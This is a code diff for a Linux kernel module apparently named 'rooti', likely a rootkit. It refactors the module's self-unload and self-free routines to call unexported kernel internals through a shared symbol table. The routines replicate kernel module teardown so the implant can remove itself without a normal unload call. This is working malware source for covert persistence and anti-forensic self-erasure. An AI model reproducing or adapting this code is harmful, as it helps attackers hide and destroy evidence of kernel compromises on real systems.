@@ -29,68 +29,52 @@ static int __try_release_module_ref(struct module *mod)
 }
 
 // Similar to the kernel's free_module()
-static int rooti_self_free(void)
+static void rooti_self_free(void)
 {
-    ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
-    ROOTI_RESOLVE_FUNC_ADDR(mod_sysfs_teardown, -ENOENT, void, struct module *);
-    ROOTI_RESOLVE_FUNC_ADDR(module_arch_cleanup, -ENOENT, void, struct module *);
-    ROOTI_RESOLVE_FUNC_ADDR(module_unload_free, -ENOENT, void, struct module *);
-    ROOTI_RESOLVE_FUNC_ADDR(module_destroy_params, -ENOENT, void, const struct kernel_param *, unsigned);
-    ROOTI_RESOLVE_FUNC_ADDR(mod_tree_remove, -ENOENT, void, struct module *);
-    ROOTI_RESOLVE_FUNC_ADDR(module_bug_cleanup, -ENOENT, void, struct module *);
-    ROOTI_RESOLVE_FUNC_ADDR(module_arch_freeing_init, -ENOENT, void, struct module *);
-
 #ifdef ROOTI_DEBUG_SHOWME
-    __mod_sysfs_teardown(THIS_MODULE);
+    rooti_sym_repo.mod_sysfs_teardown(THIS_MODULE);
 #endif
 
-    mutex_lock(__module_mutex);
+    mutex_lock(rooti_sym_repo.module_mutex);
     THIS_MODULE->state = MODULE_STATE_UNFORMED;
-    mutex_unlock(__module_mutex);
+    mutex_unlock(rooti_sym_repo.module_mutex);
 
-    __module_arch_cleanup(THIS_MODULE);
+    rooti_sym_repo.module_arch_cleanup(THIS_MODULE);
 
-    __module_unload_free(THIS_MODULE);
+    rooti_sym_repo.module_unload_free(THIS_MODULE);
 
-    __module_destroy_params(THIS_MODULE->kp, THIS_MODULE->num_kp);
+    rooti_sym_repo.module_destroy_params(THIS_MODULE->kp, THIS_MODULE->num_kp);
 
-    mutex_lock(__module_mutex);
+    mutex_lock(rooti_sym_repo.module_mutex);
 
 #ifdef ROOTI_DEBUG_SHOWME
     list_del_rcu(&THIS_MODULE->list);
 #endif
 
-    __mod_tree_remove(THIS_MODULE);
+    rooti_sym_repo.mod_tree_remove(THIS_MODULE);
 
-    __module_bug_cleanup(THIS_MODULE);
+    rooti_sym_repo.module_bug_cleanup(THIS_MODULE);
 
     synchronize_rcu();
 
-    mutex_unlock(__module_mutex);
+    mutex_unlock(rooti_sym_repo.module_mutex);
 
-    __module_arch_freeing_init(THIS_MODULE);
+    rooti_sym_repo.module_arch_freeing_init(THIS_MODULE);
 
     kfree(THIS_MODULE->args);
 
     // Inlined percpu_modfree()
     free_percpu(THIS_MODULE->percpu);
-
-    return 0;
 }
 
 // Similar to the kernel's sys_delete_module() but modified to unload self
 static int rooti_self_uninitialize(void)
 {
-	ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
-	ROOTI_RESOLVE_SYM_ADDR(struct blocking_notifier_head *, module_notify_list, -ENOENT);
-	ROOTI_RESOLVE_FUNC_ADDR(klp_module_going, -ENOENT, void, struct module *);
-	ROOTI_RESOLVE_FUNC_ADDR(ftrace_release_mod, -ENOENT, void, struct module *);
-
 	// Signals are not expected as this runs in the background
-	mutex_lock(__module_mutex);
+	mutex_lock(rooti_sym_repo.module_mutex);
 
 	if (THIS_MODULE->state != MODULE_STATE_LIVE) {
-	    mutex_unlock(__module_mutex);
+	    mutex_unlock(rooti_sym_repo.module_mutex);
 	    return -EBUSY;
 	}
 
@@ -99,18 +83,20 @@ static int rooti_self_uninitialize(void)
 	__try_release_module_ref(THIS_MODULE);
 	THIS_MODULE->state = MODULE_STATE_GOING;
 
-	mutex_unlock(__module_mutex);
+	mutex_unlock(rooti_sym_repo.module_mutex);
 
 	THIS_MODULE->exit();
 
-	blocking_notifier_call_chain(__module_notify_list, MODULE_STATE_GOING, THIS_MODULE);
+	blocking_notifier_call_chain(rooti_sym_repo.module_notify_list, MODULE_STATE_GOING, THIS_MODULE);
 
-	__klp_module_going(THIS_MODULE);
-	__ftrace_release_mod(THIS_MODULE);
+	rooti_sym_repo.klp_module_going(THIS_MODULE);
+	rooti_sym_repo.ftrace_release_mod(THIS_MODULE);
 
 	async_synchronize_full();
 
-	return rooti_self_free();
+	rooti_self_free();
+
+	return 0;
 }
 
 int rooti_self_destruct(void)
